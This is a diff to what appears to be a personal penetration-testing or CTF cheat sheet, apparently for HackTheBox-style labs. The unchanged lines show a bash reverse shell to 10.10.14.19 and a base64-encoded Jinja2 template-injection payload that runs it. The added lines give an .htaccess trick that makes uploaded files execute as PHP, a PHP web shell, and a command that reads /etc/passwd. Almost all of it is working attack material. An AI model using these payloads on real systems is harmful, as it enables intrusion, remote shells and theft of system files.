@@ -483,6 +483,23 @@ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.19/4443 0>&1'" | base64
 {{request.application.__globals__.__builtins__.__import__('os').popen('echo${IFS}"YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80NDQzIDA+JjEnCg=="|base64${IFS}-d|bash').read()}}
 ```
 
+File Upload:
+
+If PHP and can upload .htaccess file, upload with the following content: (and can view file path)
+```
+AddType application/x-httpd-php .gg
+```
+
+Then upload pwn.gg with the following php content and call it using /uploads/pwn.gg?cmd=cat+../../../../etc/passwd :
+```
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> 
+```
+
+Binary exploitation:
+
+Exploiting a compiled c binary that contains buffer overflow vuln and an exploitable printf function? https://metactf.com/blog/flash-ctf-my-little-pwny/
+
+
 # Pivot
 
 Use SSHUTTLE to route all traffic through a machine:
